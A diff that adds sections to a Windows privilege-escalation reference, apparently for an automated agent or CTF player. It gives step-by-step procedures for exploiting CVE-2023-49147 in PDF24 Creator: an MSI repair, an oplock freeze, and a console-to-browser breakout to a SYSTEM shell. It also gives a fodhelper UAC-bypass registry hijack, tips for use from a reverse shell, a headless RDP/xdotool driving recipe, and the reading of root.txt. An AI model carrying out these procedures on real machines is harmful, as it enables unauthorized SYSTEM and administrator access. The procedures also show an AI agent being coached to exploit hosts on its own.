@@ -262,6 +262,52 @@ Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "
 Start-Process fodhelper.exe
 ```
 
+## Vulnerable installer/repair → SYSTEM via a frozen console dialog
+
+A large class of third-party Windows apps ship an MSI whose **repair** action
+runs a helper as SYSTEM *without a UAC prompt* — any user can trigger
+`msiexec /fa {ProductCode}` (or `/fa <path.msi>`). If that SYSTEM helper opens a
+visible console window, you can turn it into an interactive SYSTEM shell. The
+recurring example is PDF24 Creator ≤ 11.15.1 (CVE-2023-49147), where the repair
+runs `pdf24-PrinterInstall.exe` as SYSTEM writing `faxPrnInst.log`; the same
+shape appears in other "installs a printer/driver on repair" products.
+
+How to reason about it:
+
+1. **Confirm the primitive is unprivileged.** Pin the app version, check the CVE,
+   and run `msiexec /fa {ProductCode}` — no UAC prompt means you have it. Get the
+   ProductCode from the Uninstall registry key or `(Get-Package …).Metadata`.
+2. **You need an interactive desktop.** These are GUI-driven: the target user
+   must be in `Remote Desktop Users` (or you already have a session). If only
+   RDP is open, that is the intended interactive surface, not a dead end.
+3. **Freeze the SYSTEM helper on the file it writes, with an EXCLUSIVE oplock.**
+   A level-II (read) oplock breaks *without* blocking the opener — the console
+   flashes and closes and you miss it. Request `OPLOCK_LEVEL_CACHE_READ |
+   CACHE_WRITE | CACHE_HANDLE` via `FSCTL_REQUEST_OPLOCK` and **never
+   acknowledge** the break: the SYSTEM opener blocks and its console window stays
+   frozen open. The target file must exist first, so run one repair pass to
+   create it, then hold the oplock and repair again. (SetOpLock from
+   googleprojectzero/symboliclink-testing-tools does this; a ~30-line mingw C
+   program does too.)
+4. **Break out of the frozen SYSTEM console to a shell.** Right-click its title
+   bar → **Properties** → click the **"legacy console mode"** hyperlink. Because
+   the console is a SYSTEM process, this opens the default browser as SYSTEM
+   (pick Firefox/Chrome, not Edge/IE on modern Windows). In the browser press
+   **Ctrl+O**, browse to `System32`, **right-click `cmd.exe` → Open** (typing it
+   in the filename only downloads it). The shell is titled *Administrator:
+   cmd.exe* and is `NT AUTHORITY\SYSTEM`. This "SYSTEM GUI app → file dialog →
+   right-click Open" pivot is reusable against any elevated dialog you can reach.
+
+**Driving a GUI exploit headless from the container** (no `/drive`/FUSE, no
+seat): `Xvfb :1 -screen 0 1360x820x24 &` then
+`DISPLAY=:1 xfreerdp /v:<ip> /u:<user> /p:<pass> /cert:ignore /size:1360x820`,
+act with `xdotool` (there is no window manager — click by coordinate, do **not**
+`windowactivate`), and screenshot each step with `import -window root out.png`.
+Read every screenshot before the next action. Deliver `.exe` helpers through
+whatever file-write primitive you already have (e.g. a git→webroot CI/CD deploy)
+since drive redirection needs FUSE. Packages: `freerdp3-x11 xdotool imagemagick
+mingw-w64`.
+
 ## Backstop
 
 ```
@@ -274,3 +320,37 @@ checklist confirmation, not a substitute for `whoami /priv`.
 
 If the host is in a domain, stop treating it as a standalone box and switch to
 `references/ad.md` — the escalation is usually a domain path, not a local one.
+
+## "Admin behind a filtered token": read whoami /groups before hunting
+
+Not every escalation on Windows is a misconfiguration to find. Run `whoami /groups` early and
+read the integrity label and the Administrators entry together:
+
+- **`BUILTIN\Administrators` present but "Group used for deny only", label = Medium Mandatory
+  Level** => the current user *is* a local administrator; UAC merely handed this process a
+  filtered token. The task is a **UAC bypass**, not a privilege hunt. Stop enumerating sudo-
+  equivalents; you already have the rights, you need High integrity.
+- Administrators simply absent => genuinely not admin; enumerate services/tokens/etc. as usual.
+
+Confirm the bypass is viable: `EnableLUA=1` and `ConsentPromptBehaviorAdmin` not `0`.
+
+### fodhelper (auto-elevating) — and two gotchas that waste an hour
+fodhelper.exe auto-elevates and reads a user-writable command from
+`HKCU\Software\Classes\ms-settings\Shell\Open\command`:
+1. set the key''s default value to your command, and `DelegateExecute` to an empty REG_SZ;
+2. launch fodhelper; it runs your command at High integrity.
+
+- **WOW64 view.** If your shell is 32-bit (e.g. from a 32-bit service exploit), `reg.exe` and
+  `System32\fodhelper.exe` are redirected to the WOW64 registry/filesystem, so the keys land
+  where 64-bit fodhelper never looks and nothing fires. Use the 64-bit copies explicitly:
+  `C:\Windows\Sysnative\reg.exe` and `C:\Windows\Sysnative\fodhelper.exe`.
+- **Detached launch.** From a console-less reverse shell, `start "" fodhelper.exe` blocks the
+  shell (no console to spawn the window). Launch it detached instead:
+  `powershell -c "Start-Process C:\Windows\System32\fodhelper.exe"` (64-bit powershell).
+
+Verify success by having the elevated command drop a marker (`whoami /groups > file`): a
+`High Mandatory Level` label with Administrators now *enabled* confirms elevation. Then have
+it read `C:\Users\Administrator\Desktop\root.txt` into a folder your unelevated user owns and
+read it back. Other auto-elevate hijacks (SilentCleanup scheduled task, computerdefaults.exe,
+sdclt) are drop-in alternatives if fodhelper is blocked; the deny-only-token reasoning is the
+transferable part. Clean up: `reg delete HKCU\Software\Classes\ms-settings /f`.
